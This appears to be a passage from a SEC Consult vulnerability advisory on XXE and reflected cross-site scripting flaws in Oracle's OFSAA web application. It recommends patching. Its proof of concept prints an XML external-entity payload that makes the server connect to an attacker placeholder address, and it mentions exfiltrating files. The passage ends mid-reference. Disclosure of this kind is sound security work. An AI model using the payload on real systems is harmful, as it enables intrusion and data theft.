Business recommendation

By exploiting the XXE vulnerability, an attacker can get read access to the filesystem of the user’s system using the OFSAA web application and thus obtain sensitive information from the system. It is also possible to bypass input validation checks in order to inject JavaScript code.

SEC Consult recommends to immediately install the patched version. Furthermore, a thorough security review should be performed by security professionals to identify potential further security issues.
Vulnerability overview/description
1) XML eXternal Entity (XXE) Injection (CVE-2018-2660)

The web application allows users to import XML files. An attacker can import a specially crafted XML file and exploit the XXE vulnerability within the application.
2) Reflected Cross Site Scripting (CVE-2018-2661)

This vulnerability allows an unauthenticated user to inject malicious client side script which will be executed in the browser of a user if he visits the manipulated URL.
Proof of concept
1) XML External Entity Injection (XXE) (CVE-2018-2660)

For example, by importing the following XML code in the “Business Model Upload” function a connection request from the server to the attacker’s system will be made.

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://[IP:port]/" >]><foo>&xxe;</foo>

IP:port = IP address and port where the attacker is listening for connections

Furthermore some files can be exfiltrated to remote servers via the techniques described in:
